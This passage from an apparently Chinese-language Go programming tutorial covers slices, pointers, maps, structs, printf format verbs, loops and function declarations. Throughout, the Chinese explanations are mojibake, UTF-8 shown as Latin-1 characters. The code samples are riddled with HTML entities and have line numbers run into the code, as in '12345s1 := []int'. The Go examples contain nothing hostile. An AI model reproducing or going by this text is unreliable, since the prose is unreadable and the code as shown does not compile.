å¹¶ä¸æ˜¯æ•°ç»„æˆ–æ•°ç»„æŒ‡é’ˆã€‚å®ƒé€šè¿‡å†…éƒ¨æŒ‡é’ˆå’Œç›¸å…³å±æ€§å¼•ç”¨æ•°ç»„ç‰‡æ®µï¼Œä»¥å®ç°å˜é•¿æ–¹æ¡ˆ,æ‰€ä»¥å¯ä»¥è¯´åˆ‡ç‰‡æ˜¯ä¸€ä¸ªåŠ¨æ€æ•°ç»„ 12345s1 := []int&#123;1, 2, 3&#125;s1 = append(s1, 1234)s3 := make([]int, 5)fmt.Println(s1,s3) æŒ‡é’ˆåŒºåˆ«äºC&#x2F;C++ä¸­çš„æŒ‡é’ˆï¼ŒGoè¯­è¨€ä¸­çš„æŒ‡é’ˆä¸èƒ½è¿›è¡Œåç§»å’Œè¿ç®—ï¼Œæ˜¯å®‰å…¨æŒ‡é’ˆã€‚ Goè¯­è¨€ä¸­çš„å‡½æ•°ä¼ å‚éƒ½æ˜¯å€¼æ‹·è´ï¼Œå½“æˆ‘ä»¬æƒ³è¦ä¿®æ”¹æŸä¸ªå˜é‡çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªæŒ‡å‘è¯¥å˜é‡åœ°å€çš„æŒ‡é’ˆå˜é‡ã€‚ä¼ é€’æ•°æ®ä½¿ç”¨æŒ‡é’ˆï¼Œè€Œæ— é¡»æ‹·è´æ•°æ®ã€‚ç±»å‹æŒ‡é’ˆä¸èƒ½è¿›è¡Œåç§»å’Œè¿ç®—ã€‚Goè¯­è¨€ä¸­çš„æŒ‡é’ˆæ“ä½œéå¸¸ç®€å•ï¼Œåªéœ€è¦è®°ä½ä¸¤ä¸ªç¬¦å·ï¼š&amp;ï¼ˆå–åœ°å€ï¼‰å’Œ*ï¼ˆæ ¹æ®åœ°å€å–å€¼ï¼‰ã€‚ æŒ‡é’ˆåœ°å€å’ŒæŒ‡é’ˆç±»å‹æ¯ä¸ªå˜é‡åœ¨è¿è¡Œæ—¶éƒ½æ‹¥æœ‰ä¸€ä¸ªåœ°å€ï¼Œè¿™ä¸ªåœ°å€ä»£è¡¨å˜é‡åœ¨å†…å­˜ä¸­çš„ä½ç½®ã€‚Goè¯­è¨€ä¸­ä½¿ç”¨&amp;å­—ç¬¦æ”¾åœ¨å˜é‡å‰é¢å¯¹å˜é‡è¿›è¡Œâ€œå–åœ°å€â€æ“ä½œã€‚ Goè¯­è¨€ä¸­çš„å€¼ç±»å‹ï¼ˆintã€floatã€boolã€stringã€arrayã€structï¼‰éƒ½æœ‰å¯¹åº”çš„æŒ‡é’ˆç±»å‹ï¼Œå¦‚ï¼š*intã€*int64ã€*stringç­‰ã€‚ å–å˜é‡æŒ‡é’ˆçš„è¯­æ³•å¦‚ä¸‹ï¼š 1234ptr := &amp;v // vçš„ç±»å‹ä¸ºTv:ä»£è¡¨è¢«å–åœ°å€çš„å˜é‡ï¼Œç±»å‹ä¸ºTptr:ç”¨äºæ¥æ”¶åœ°å€çš„å˜é‡ï¼Œptrçš„ç±»å‹å°±ä¸º*Tï¼Œç§°åšTçš„æŒ‡é’ˆç±»å‹ã€‚*ä»£è¡¨æŒ‡é’ˆã€‚ 12345a := 10 b := &amp;a fmt.Printf(&quot;a:%d ptr:%p &quot;, a, &amp;a) // a:10 ptr:0xc00001a078 fmt.Printf(&quot;b:%p type:%T &quot;, b, b) // b:0xc00001a078 type:*int fmt.Println(&amp;b) // 0xc00000e018 æŒ‡é’ˆå–å€¼åœ¨å¯¹æ™®é€šå˜é‡ä½¿ç”¨&amp;æ“ä½œç¬¦å–åœ°å€åä¼šè·å¾—è¿™ä¸ªå˜é‡çš„æŒ‡é’ˆï¼Œç„¶åå¯ä»¥å¯¹æŒ‡é’ˆä½¿ç”¨*æ“ä½œï¼Œä¹Ÿå°±æ˜¯æŒ‡é’ˆå–å€¼ï¼Œä»£ç å¦‚ä¸‹ã€‚ 1234567891011//æŒ‡é’ˆå–å€¼ a := 10 b := &amp;a // å–å˜é‡açš„åœ°å€ï¼Œå°†æŒ‡é’ˆä¿å­˜åˆ°bä¸­ fmt.Printf(&quot;type of b:%T &quot;, b) c := *b // æŒ‡é’ˆå–å€¼ï¼ˆæ ¹æ®æŒ‡é’ˆå»å†…å­˜å–å€¼ï¼‰ fmt.Printf(&quot;type of c:%T &quot;, c) fmt.Printf(&quot;value of c:%v &quot;, c)type of b:*int type of c:int value of c:10 æ€»ç»“ï¼š å–åœ°å€æ“ä½œç¬¦&amp;å’Œå–å€¼æ“ä½œç¬¦*æ˜¯ä¸€å¯¹äº’è¡¥æ“ä½œç¬¦ï¼Œ&amp;å–å‡ºåœ°å€ï¼Œ*æ ¹æ®åœ°å€å–å‡ºåœ°å€æŒ‡å‘çš„å€¼ã€‚ å˜é‡ã€æŒ‡é’ˆåœ°å€ã€æŒ‡é’ˆå˜é‡ã€å–åœ°å€ã€å–å€¼çš„ç›¸äº’å…³ç³»å’Œç‰¹æ€§å¦‚ä¸‹ï¼š\\ å¯¹å˜é‡è¿›è¡Œå–åœ°å€ï¼ˆ&amp;ï¼‰æ“ä½œï¼Œå¯ä»¥è·å¾—è¿™ä¸ªå˜é‡çš„æŒ‡é’ˆå˜é‡ æŒ‡é’ˆå˜é‡çš„å€¼æ˜¯æŒ‡é’ˆåœ°å€ã€‚ å¯¹æŒ‡é’ˆå˜é‡è¿›è¡Œå–å€¼ï¼ˆ*ï¼‰æ“ä½œï¼Œå¯ä»¥è·å¾—æŒ‡é’ˆå˜é‡æŒ‡å‘çš„åŸå˜é‡çš„å€¼ã€‚ 123456789101112131415func modify1(x int) &#123; x = 100&#125;func modify2(x *int) &#123; *x = 100&#125;func main() &#123; a := 10 modify1(a) fmt.Println(a) // 10 modify2(&amp;a) fmt.Println(a) // 100&#125; ç©ºæŒ‡é’ˆ å½“ä¸€ä¸ªæŒ‡é’ˆè¢«å®šä¹‰åæ²¡æœ‰åˆ†é…åˆ°ä»»ä½•å˜é‡æ—¶ï¼Œå®ƒçš„å€¼ä¸º nil ç©ºæŒ‡é’ˆçš„åˆ¤æ–­ 12345678var p *string fmt.Println(p) fmt.Printf(&quot;pçš„å€¼æ˜¯%s/n&quot;, p) if p != nil &#123; fmt.Println(&quot;éç©º&quot;) &#125; else &#123; fmt.Println(&quot;ç©ºå€¼&quot;) &#125; Mapmapæ˜¯ä¸€ç§æ— åºçš„åŸºäºkey-valueçš„æ•°æ®ç»“æ„ï¼ŒGoè¯­è¨€ä¸­çš„mapæ˜¯å¼•ç”¨ç±»å‹ï¼Œå¿…é¡»åˆå§‹åŒ–æ‰èƒ½ä½¿ç”¨ã€‚ mapå®šä¹‰Goè¯­è¨€ä¸­ mapçš„å®šä¹‰è¯­æ³•å¦‚ä¸‹ 1map[KeyType]ValueType å…¶ä¸­ 12KeyType:è¡¨ç¤ºé”®çš„ç±»å‹ã€‚ValueType:è¡¨ç¤ºé”®å¯¹åº”çš„å€¼çš„ç±»å‹ã€‚ mapç±»å‹çš„å˜é‡é»˜è®¤åˆå§‹å€¼ä¸ºnilï¼Œéœ€è¦ä½¿ç”¨make()å‡½æ•°æ¥åˆ†é…å†…å­˜ã€‚è¯­æ³•ä¸ºï¼š 1make(map[KeyType]ValueType, [cap]) å…¶ä¸­capè¡¨ç¤ºmapçš„å®¹é‡ï¼Œè¯¥å‚æ•°è™½ç„¶ä¸æ˜¯å¿…é¡»çš„ï¼Œä½†æ˜¯æˆ‘ä»¬åº”è¯¥åœ¨åˆå§‹åŒ–mapçš„æ—¶å€™å°±ä¸ºå…¶æŒ‡å®šä¸€ä¸ªåˆé€‚çš„å®¹é‡ã€‚ mapåŸºæœ¬ä½¿ç”¨mapä¸­çš„æ•°æ®éƒ½æ˜¯æˆå¯¹å‡ºç°çš„ï¼Œmapçš„åŸºæœ¬ä½¿ç”¨ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š 12345678func main() &#123; scoreMap := make(map[string]int, 8) scoreMap[&quot;å¼ ä¸‰&quot;] = 90 scoreMap[&quot;å°æ˜&quot;] = 100 fmt.Println(scoreMap) fmt.Println(scoreMap[&quot;å°æ˜&quot;]) fmt.Printf(&quot;type of a:%T &quot;, scoreMap)&#125; 123map[å°æ˜:100 å¼ ä¸‰:90]100type of a:map[string]int mapä¹Ÿæ”¯æŒåœ¨å£°æ˜çš„æ—¶å€™å¡«å……å…ƒç´ ï¼Œä¾‹å¦‚ï¼š 12345scoreMap := map[string]int&#123;\t&quot;A&quot;: 100,\t&quot;B&quot;: 60,&#125;fmt.Println(scoreMap) åˆ¤æ–­æŸä¸ªé”®æ˜¯å¦å­˜åœ¨Goè¯­è¨€ä¸­æœ‰ä¸ªåˆ¤æ–­mapä¸­é”®æ˜¯å¦å­˜åœ¨çš„ç‰¹æ®Šå†™æ³•ï¼Œæ ¼å¼å¦‚ä¸‹: 1value, ok := map[key] ä¸¾ä¸ªä¾‹å­ï¼š 12345678910111213141516\tvalue,ok := scoreMap[&quot;A&quot;]\tif ok&#123; fmt.Println(value)\t&#125; else &#123; fmt.Println(&quot;not exist&quot;)\t&#125;\tvalues,okk := scoreMap[&quot;C&quot;]\tif okk&#123; fmt.Println(values)\t&#125; else &#123; fmt.Println(&quot;not exist&quot;)\t&#125;100not exist mapçš„éå†Goè¯­è¨€ä¸­ä½¿ç”¨for rangeéå†mapã€‚ 123for k, v := range scoreMap &#123;\tfmt.Println(k,v)&#125; æˆ–è€…åªéå† key 123for k := range scoreMap &#123; fmt.Println(k) &#125; ä½¿ç”¨delete()å‡½æ•°åˆ é™¤é”®å€¼å¯¹ä½¿ç”¨delete()å†…å»ºå‡½æ•°ä»mapä¸­åˆ é™¤ä¸€ç»„é”®å€¼å¯¹ï¼Œdelete()å‡½æ•°çš„æ ¼å¼å¦‚ä¸‹ï¼š 1delete(map, key) å…¶ä¸­ï¼Œ 12map:è¡¨ç¤ºè¦åˆ é™¤é”®å€¼å¯¹çš„mapkey:è¡¨ç¤ºè¦åˆ é™¤çš„é”®å€¼å¯¹çš„é”® ç»“æ„ä½“Goè¯­è¨€ä¸­çš„åŸºç¡€æ•°æ®ç±»å‹å¯ä»¥è¡¨ç¤ºä¸€äº›äº‹ç‰©çš„åŸºæœ¬å±æ€§ï¼Œä½†æ˜¯å½“æˆ‘ä»¬æƒ³è¡¨è¾¾ä¸€ä¸ªäº‹ç‰©çš„å…¨éƒ¨æˆ–éƒ¨åˆ†å±æ€§æ—¶ï¼Œè¿™æ—¶å€™å†ç”¨å•ä¸€çš„åŸºæœ¬æ•°æ®ç±»å‹æ˜æ˜¾å°±æ— æ³•æ»¡è¶³éœ€æ±‚äº†ï¼ŒGoè¯­è¨€æä¾›äº†ä¸€ç§è‡ªå®šä¹‰æ•°æ®ç±»å‹ï¼Œå¯ä»¥å°è£…å¤šä¸ªåŸºæœ¬æ•°æ®ç±»å‹ï¼Œè¿™ç§æ•°æ®ç±»å‹å«ç»“æ„ä½“ï¼Œè‹±æ–‡åç§°structã€‚ ä¹Ÿå°±æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡structæ¥å®šä¹‰è‡ªå·±çš„ç±»å‹äº†ã€‚ Goè¯­è¨€ä¸­é€šè¿‡structæ¥å®ç°é¢å‘å¯¹è±¡ã€‚ ç»“æ„ä½“çš„å®šä¹‰ä½¿ç”¨typeå’Œstructå…³é”®å­—æ¥å®šä¹‰ç»“æ„ä½“ï¼Œå…·ä½“ä»£ç æ ¼å¼å¦‚ä¸‹ï¼š 12345type ç±»å‹å struct &#123; å­—æ®µå å­—æ®µç±»å‹ å­—æ®µå å­—æ®µç±»å‹ â€¦&#125; å…¶ä¸­ï¼š 1231.ç±»å‹åï¼šæ ‡è¯†è‡ªå®šä¹‰ç»“æ„ä½“çš„åç§°ï¼Œåœ¨åŒä¸€ä¸ªåŒ…å†…ä¸èƒ½é‡å¤ã€‚2.å­—æ®µåï¼šè¡¨ç¤ºç»“æ„ä½“å­—æ®µåã€‚ç»“æ„ä½“ä¸­çš„å­—æ®µåå¿…é¡»å”¯ä¸€ã€‚3.å­—æ®µç±»å‹ï¼šè¡¨ç¤ºç»“æ„ä½“å­—æ®µçš„å…·ä½“ç±»å‹ã€‚ ä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬å®šä¹‰ä¸€ä¸ªPersonï¼ˆäººï¼‰ç»“æ„ä½“ï¼Œä»£ç å¦‚ä¸‹ï¼š 12345type person struct &#123; name string city string age int8&#125; åŒæ ·ç±»å‹çš„å­—æ®µä¹Ÿå¯ä»¥å†™åœ¨ä¸€è¡Œï¼Œ 1234type person1 struct &#123; name, city string age int8&#125; è¿™æ ·æˆ‘ä»¬å°±æ‹¥æœ‰äº†ä¸€ä¸ªpersonçš„è‡ªå®šä¹‰ç±»å‹ï¼Œå®ƒæœ‰nameã€cityã€ageä¸‰ä¸ªå­—æ®µï¼Œåˆ†åˆ«è¡¨ç¤ºå§“åã€åŸå¸‚å’Œå¹´é¾„ã€‚è¿™æ ·æˆ‘ä»¬ä½¿ç”¨è¿™ä¸ªpersonç»“æ„ä½“å°±èƒ½å¤Ÿå¾ˆæ–¹ä¾¿çš„åœ¨ç¨‹åºä¸­è¡¨ç¤ºå’Œå­˜å‚¨äººä¿¡æ¯äº†ã€‚ è¯­è¨€å†…ç½®çš„åŸºç¡€æ•°æ®ç±»å‹æ˜¯ç”¨æ¥æè¿°ä¸€ä¸ªå€¼çš„ï¼Œè€Œç»“æ„ä½“æ˜¯ç”¨æ¥æè¿°ä¸€ç»„å€¼çš„ã€‚æ¯”å¦‚ä¸€ä¸ªäººæœ‰åå­—ã€å¹´é¾„å’Œå±…ä½åŸå¸‚ç­‰ï¼Œæœ¬è´¨ä¸Šæ˜¯ä¸€ç§èšåˆå‹çš„æ•°æ®ç±»å‹ ç»“æ„ä½“å®ä¾‹åŒ–åªæœ‰å½“ç»“æ„ä½“å®ä¾‹åŒ–æ—¶ï¼Œæ‰ä¼šçœŸæ­£åœ°åˆ†é…å†…å­˜ã€‚ä¹Ÿå°±æ˜¯å¿…é¡»å®ä¾‹åŒ–åæ‰èƒ½ä½¿ç”¨ç»“æ„ä½“çš„å­—æ®µã€‚ ç»“æ„ä½“æœ¬èº«ä¹Ÿæ˜¯ä¸€ç§ç±»å‹ï¼Œæˆ‘ä»¬å¯ä»¥åƒå£°æ˜å†…ç½®ç±»å‹ä¸€æ ·ä½¿ç”¨varå…³é”®å­—å£°æ˜ç»“æ„ä½“ç±»å‹ã€‚ 1var ç»“æ„ä½“å®ä¾‹ ç»“æ„ä½“ç±»å‹ åŸºæœ¬å®ä¾‹åŒ–1234567891011121314type person struct &#123; name string city string age int8&#125;func main() &#123; var p1 person p1.name = &quot;pprof.cn&quot; p1.city = &quot;åŒ—äº¬&quot; p1.age = 18 fmt.Printf(&quot;p1=%v &quot;, p1) //p1=&#123;pprof.cn åŒ—äº¬ 18&#125; fmt.Printf(&quot;p1=%#v &quot;, p1) //p1=main.person&#123;name:&quot;pprof.cn&quot;, city:&quot;åŒ—äº¬&quot;, age:18&#125;&#125; æˆ‘ä»¬é€šè¿‡.æ¥è®¿é—®ç»“æ„ä½“çš„å­—æ®µï¼ˆæˆå‘˜å˜é‡ï¼‰,ä¾‹å¦‚p1.nameå’Œp1.ageç­‰ã€‚ æŒ‡é’ˆç±»å‹ç»“æ„ä½“æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡ä½¿ç”¨newå…³é”®å­—å¯¹ç»“æ„ä½“è¿›è¡Œå®ä¾‹åŒ–ï¼Œå¾—åˆ°çš„æ˜¯ç»“æ„ä½“çš„åœ°å€ã€‚ æ ¼å¼å¦‚ä¸‹ï¼š 123var p2 = new(person) fmt.Printf(&quot;%T &quot;, p2) //*main.person fmt.Printf(&quot;p2=%#v &quot;, p2) //p2=&amp;main.person&#123;name:&quot;&quot;, city:&quot;&quot;, age:0&#125; ä½¿ç”¨&amp;å¯¹ç»“æ„ä½“è¿›è¡Œå–åœ°å€æ“ä½œç›¸å½“äºå¯¹è¯¥ç»“æ„ä½“ç±»å‹è¿›è¡Œäº†ä¸€æ¬¡newå®ä¾‹åŒ–æ“ä½œã€‚ 1234567p3 := &amp;person&#123;&#125;fmt.Printf(&quot;%T &quot;, p3) //*main.personfmt.Printf(&quot;p3=%#v &quot;, p3) //p3=&amp;main.person&#123;name:&quot;&quot;, city:&quot;&quot;, age:0&#125;p3.name = &quot;åšå®¢&quot;p3.age = 30p3.city = &quot;æˆéƒ½&quot;fmt.Printf(&quot;p3=%#v &quot;, p3) //p3=&amp;main.person&#123;name:&quot;åšå®¢&quot;, city:&quot;æˆéƒ½&quot;, age:30&#125; p3.name &#x3D; â€œåšå®¢â€å…¶å®åœ¨åº•å±‚æ˜¯(*p3).name &#x3D; â€œåšå®¢â€ï¼Œè¿™æ˜¯Goè¯­è¨€å¸®æˆ‘ä»¬å®ç°çš„è¯­æ³•ç³–ã€‚ å ä½ç¬¦é€šç”¨å‹*printfç³»åˆ—å‡½æ•°éƒ½æ”¯æŒformatæ ¼å¼åŒ–å‚æ•°ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬æŒ‰ç…§å ä½ç¬¦å°†è¢«æ›¿æ¢çš„å˜é‡ç±»å‹åˆ’åˆ†ï¼Œæ–¹ä¾¿æŸ¥è¯¢å’Œè®°å¿†ã€‚ å ä½ç¬¦ è¯´æ˜ %v å€¼çš„é»˜è®¤æ ¼å¼è¡¨ç¤º %+v ç±»ä¼¼%vï¼Œä½†è¾“å‡ºç»“æ„ä½“æ—¶ä¼šæ·»åŠ å­—æ®µå %#v å€¼çš„Goè¯­æ³•è¡¨ç¤º %T æ‰“å°å€¼çš„ç±»å‹ %% ç™¾åˆ†å· æ•´å½¢ å ä½ç¬¦ è¯´æ˜ %b è¡¨ç¤ºä¸ºäºŒè¿›åˆ¶ %c è¯¥å€¼å¯¹åº”çš„unicodeç å€¼ %d è¡¨ç¤ºä¸ºåè¿›åˆ¶ %o è¡¨ç¤ºä¸ºå…«è¿›åˆ¶ %x è¡¨ç¤ºä¸ºåå…­è¿›åˆ¶ï¼Œä½¿ç”¨a-f %X è¡¨ç¤ºä¸ºåå…­è¿›åˆ¶ï¼Œä½¿ç”¨A-F %U è¡¨ç¤ºä¸ºUnicodeæ ¼å¼ï¼šU+1234ï¼Œç­‰ä»·äºâ€U+%04Xâ€ %q è¯¥å€¼å¯¹åº”çš„å•å¼•å·æ‹¬èµ·æ¥çš„goè¯­æ³•å­—ç¬¦å­—é¢å€¼ï¼Œå¿…è¦æ—¶ä¼šé‡‡ç”¨å®‰å…¨çš„è½¬ä¹‰è¡¨ç¤º å¸ƒå°”å‹ å ä½ç¬¦ è¯´æ˜ %t trueæˆ–false æµ®ç‚¹æ•°ä¸å¤æ•° å ä½ç¬¦ è¯´æ˜ %b æ— å°æ•°éƒ¨åˆ†ã€äºŒè¿›åˆ¶æŒ‡æ•°çš„ç§‘å­¦è®¡æ•°æ³•ï¼Œå¦‚-123456p-78 %e ç§‘å­¦è®¡æ•°æ³•ï¼Œå¦‚-1234.456e+78 %E ç§‘å­¦è®¡æ•°æ³•ï¼Œå¦‚-1234.456E+78 %f æœ‰å°æ•°éƒ¨åˆ†ä½†æ— æŒ‡æ•°éƒ¨åˆ†ï¼Œå¦‚123.456 %F ç­‰ä»·äº%f %g æ ¹æ®å®é™…æƒ…å†µé‡‡ç”¨%eæˆ–%fæ ¼å¼ï¼ˆä»¥è·å¾—æ›´ç®€æ´ã€å‡†ç¡®çš„è¾“å‡ºï¼‰ %G æ ¹æ®å®é™…æƒ…å†µé‡‡ç”¨%Eæˆ–%Fæ ¼å¼ï¼ˆä»¥è·å¾—æ›´ç®€æ´ã€å‡†ç¡®çš„è¾“å‡ºï¼‰ å­—ç¬¦ä¸²å’Œ[]byte å ä½ç¬¦ è¯´æ˜ %s ç›´æ¥è¾“å‡ºå­—ç¬¦ä¸²æˆ–è€…[]byte %q è¯¥å€¼å¯¹åº”çš„åŒå¼•å·æ‹¬èµ·æ¥çš„goè¯­æ³•å­—ç¬¦ä¸²å­—é¢å€¼ï¼Œå¿…è¦æ—¶ä¼šé‡‡ç”¨å®‰å…¨çš„è½¬ä¹‰è¡¨ç¤º %x æ¯ä¸ªå­—èŠ‚ç”¨ä¸¤å­—ç¬¦åå…­è¿›åˆ¶æ•°è¡¨ç¤ºï¼ˆä½¿ç”¨a-f %X æ¯ä¸ªå­—èŠ‚ç”¨ä¸¤å­—ç¬¦åå…­è¿›åˆ¶æ•°è¡¨ç¤ºï¼ˆä½¿ç”¨A-Fï¼‰ æŒ‡é’ˆ å ä½ç¬¦ è¯´æ˜ %p è¡¨ç¤ºä¸ºåå…­è¿›åˆ¶ï¼Œå¹¶åŠ ä¸Šå‰å¯¼çš„0x å®½åº¦æ ‡è¯†ç¬¦ å ä½ç¬¦ è¯´æ˜ %f é»˜è®¤å®½åº¦ï¼Œé»˜è®¤ç²¾åº¦ %9f å®½åº¦9ï¼Œé»˜è®¤ç²¾åº¦ %.2f é»˜è®¤å®½åº¦ï¼Œç²¾åº¦2 %9.2f å®½åº¦9ï¼Œç²¾åº¦2 %9.f å®½åº¦9ï¼Œç²¾åº¦0 å…¶ä»– flag å ä½ç¬¦ è¯´æ˜ â€™+â€™ æ€»æ˜¯è¾“å‡ºæ•°å€¼çš„æ­£è´Ÿå·ï¼›å¯¹%qï¼ˆ%+qï¼‰ä¼šç”Ÿæˆå…¨éƒ¨æ˜¯ASCIIå­—ç¬¦çš„è¾“å‡ºï¼ˆé€šè¿‡è½¬ä¹‰ï¼‰ï¼› â€™ â€˜ å¯¹æ•°å€¼ï¼Œæ­£æ•°å‰åŠ ç©ºæ ¼è€Œè´Ÿæ•°å‰åŠ è´Ÿå·ï¼›å¯¹å­—ç¬¦ä¸²é‡‡ç”¨%xæˆ–%Xæ—¶ï¼ˆ% xæˆ–% Xï¼‰ä¼šç»™å„æ‰“å°çš„å­—èŠ‚ä¹‹é—´åŠ ç©ºæ ¼ â€™-â€™ åœ¨è¾“å‡ºå³è¾¹å¡«å……ç©ºç™½è€Œä¸æ˜¯é»˜è®¤çš„å·¦è¾¹ï¼ˆå³ä»é»˜è®¤çš„å³å¯¹é½åˆ‡æ¢ä¸ºå·¦å¯¹é½ï¼‰ï¼› â€™#â€™ å…«è¿›åˆ¶æ•°å‰åŠ 0ï¼ˆ%#oï¼‰ï¼Œåå…­è¿›åˆ¶æ•°å‰åŠ 0xï¼ˆ%#xï¼‰æˆ–0Xï¼ˆ%#Xï¼‰ï¼ŒæŒ‡é’ˆå»æ‰å‰é¢çš„0xï¼ˆ%#pï¼‰å¯¹%qï¼ˆ%#qï¼‰ï¼Œå¯¹%Uï¼ˆ%#Uï¼‰ä¼šè¾“å‡ºç©ºæ ¼å’Œå•å¼•å·æ‹¬èµ·æ¥çš„goå­—é¢å€¼ï¼› â€˜0â€™ ä½¿ç”¨0è€Œä¸æ˜¯ç©ºæ ¼å¡«å……ï¼Œå¯¹äºæ•°å€¼ç±»å‹ä¼šæŠŠå¡«å……çš„0æ”¾åœ¨æ­£è´Ÿå·åé¢ï¼› æµç¨‹æ§åˆ¶æ¡ä»¶è¯­å¥ifæ¡ä»¶è¯­å¥switchswitch è¯­å¥ç”¨äºåŸºäºä¸åŒæ¡ä»¶æ‰§è¡Œä¸åŒåŠ¨ä½œï¼Œæ¯ä¸€ä¸ª case åˆ†æ”¯éƒ½æ˜¯å”¯ä¸€çš„ï¼Œä»ä¸Šç›´ä¸‹é€ä¸€æµ‹è¯•ï¼Œç›´åˆ°åŒ¹é…ä¸ºæ­¢ã€‚ Golang switch åˆ†æ”¯è¡¨è¾¾å¼å¯ä»¥æ˜¯ä»»æ„ç±»å‹ï¼Œä¸é™äºå¸¸é‡ã€‚å¯çœç•¥ breakï¼Œé»˜è®¤è‡ªåŠ¨ç»ˆæ­¢ã€‚ 12345678switch var1 &#123; case val1: ... case val2: ... default: ...&#125; å¾ªç¯è¯­å¥for12345678910111213for i, n := 0, len(s); i &lt; n; i++ &#123; // å¸¸è§çš„ for å¾ªç¯ï¼Œæ”¯æŒåˆå§‹åŒ–è¯­å¥ã€‚ println(s[i])&#125;n := len(s)for n &gt; 0 &#123; // æ›¿ä»£ while (n &gt; 0) &#123;&#125; println(s[n]) // æ›¿ä»£ for (; n &gt; 0;) &#123;&#125; n-- &#125;for &#123; // æ›¿ä»£ while (true) &#123;&#125; println(s) // æ›¿ä»£ for (;;) &#123;&#125;&#125; 12345678910111213for a := 0; a &lt; 10; a++ &#123; fmt.Printf(&quot;a çš„å€¼ä¸º: %d &quot;, a)&#125;for a &lt; b &#123; a++ fmt.Printf(&quot;a çš„å€¼ä¸º: %d &quot;, a) &#125;for i,x:= range numbers &#123; fmt.Printf(&quot;ç¬¬ %d ä½ x çš„å€¼ = %d &quot;, i,x)&#125; å¾ªç¯æ§åˆ¶Gotoã€Breakã€Continue ä¸‰ä¸ªè¯­å¥éƒ½å¯ä»¥é…åˆæ ‡ç­¾(label)ä½¿ç”¨ æ ‡ç­¾ååŒºåˆ†å¤§å°å†™ï¼Œå®šä»¥åè‹¥ä¸ä½¿ç”¨ä¼šé€ æˆç¼–è¯‘é”™è¯¯ continueã€breaké…åˆæ ‡ç­¾(label)å¯ç”¨äºå¤šå±‚å¾ªç¯è·³å‡º gotoæ˜¯è°ƒæ•´æ‰§è¡Œä½ç½®ï¼Œä¸continueã€breaké…åˆæ ‡ç­¾(label)çš„ç»“æœå¹¶ä¸ç›¸åŒ å‡½æ•°golangå‡½æ•°ç‰¹ç‚¹12345678910â€¢ æ— éœ€å£°æ˜åŸå‹ã€‚â€¢ æ”¯æŒä¸å®š å˜å‚ã€‚â€¢ æ”¯æŒå¤šè¿”å›å€¼ã€‚â€¢ æ”¯æŒå‘½åè¿”å›å‚æ•°ã€‚ â€¢ æ”¯æŒåŒ¿åå‡½æ•°å’Œé—­åŒ…ã€‚â€¢ å‡½æ•°ä¹Ÿæ˜¯ä¸€ç§ç±»å‹ï¼Œä¸€ä¸ªå‡½æ•°å¯ä»¥èµ‹å€¼ç»™å˜é‡ã€‚â€¢ ä¸æ”¯æŒ åµŒå¥— (nested) ä¸€ä¸ªåŒ…ä¸èƒ½æœ‰ä¸¤ä¸ªåå­—ä¸€æ ·çš„å‡½æ•°ã€‚â€¢ ä¸æ”¯æŒ é‡è½½ (overload) â€¢ ä¸æ”¯æŒ é»˜è®¤å‚æ•° (default parameter)ã€‚ å‡½æ•°å£°æ˜å‡½æ•°å£°æ˜åŒ…å«ä¸€ä¸ªå‡½æ•°åï¼Œå‚æ•°åˆ—è¡¨ï¼Œ è¿”å›å€¼åˆ—è¡¨å’Œå‡½æ•°ä½“ã€‚å¦‚æœå‡½æ•°æ²¡æœ‰è¿”å›å€¼ï¼Œåˆ™è¿”å›åˆ—è¡¨å¯ä»¥çœç•¥ã€‚å‡½æ•°ä»ç¬¬ä¸€æ¡è¯­å¥å¼€å§‹æ‰§è¡Œï¼Œç›´åˆ°æ‰§è¡Œreturnè¯­å¥æˆ–è€…æ‰§è¡Œå‡½æ•°çš„æœ€åä¸€æ¡è¯­å¥ã€‚ å‡½æ•°å¯ä»¥æ²¡æœ‰å‚æ•°æˆ–æ¥å—å¤šä¸ªå‚æ•°ã€‚ æ³¨æ„ç±»å‹åœ¨å˜é‡åä¹‹å ã€‚ å½“ä¸¤ä¸ªæˆ–å¤šä¸ªè¿ç»­çš„å‡½æ•°å‘½åå‚æ•°æ˜¯åŒä¸€ç±»å‹ï¼Œåˆ™é™¤äº†æœ€åä¸€ä¸ªç±»å‹ä¹‹å¤–ï¼Œå…¶ä»–éƒ½å¯ä»¥çœç•¥ã€‚ å‡½æ•°å¯ä»¥è¿”å›ä»»æ„æ•°é‡çš„è¿”å›å€¼ã€‚ ä½¿ç”¨å…³é”®å­— func å®šä¹‰å‡½æ•°ï¼Œå·¦å¤§æ‹¬å·ä¾æ—§ä¸èƒ½å¦èµ·ä¸€è¡Œã€‚ 12345func test(x, y int, s string) (int, string) &#123; // ç±»å‹ç›¸åŒçš„ç›¸é‚»å‚æ•°ï¼Œå‚æ•°ç±»å‹å¯åˆå¹¶ã€‚ å¤šè¿”å›å€¼å¿…é¡»ç”¨æ‹¬å·ã€‚ n := x + y return n, fmt.Sprintf(s, n)&#125; å‡½æ•°æ˜¯ç¬¬ä¸€ç±»å¯¹è±¡ï¼Œå¯ä½œä¸ºå‚æ•°ä¼ é€’ã€‚å»ºè®®å°†å¤æ‚ç­¾åå®šä¹‰ä¸ºå‡½æ•°ç±»å‹ï¼Œä»¥ä¾¿äºé˜…è¯»ã€‚ 1234567891011121314151617181920212223package mainimport &quot;fmt&quot;func test(fn func() int) int &#123; return fn()&#125;// å®šä¹‰å‡½æ•°ç±»å‹ã€‚type FormatFunc func(s string, x, y int) string func format(fn FormatFunc, s string, x, y int) string &#123; return fn(s, x, y)&#125;func main() &#123; s1 := test(func() int &#123; return 100 &#125;) // ç›´æ¥å°†åŒ¿åå‡½æ•°å½“å‚æ•°ã€‚ s2 := format(func(s string, x, y int) string &#123; return fmt.Sprintf(s, x, y) &#125;, &quot;%d, %d&quot;, 10, 20) println(s1, s2)&#125; è¾“å‡ºç»“æœï¼š 1100 10, 20 æœ‰è¿”å›å€¼çš„å‡½æ•°ï¼Œå¿…é¡»æœ‰æ˜ç¡®çš„ç»ˆæ­¢è¯­å¥ï¼Œå¦åˆ™ä¼šå¼•å‘ç¼–è¯‘é”™è¯¯ã€‚ ä½ 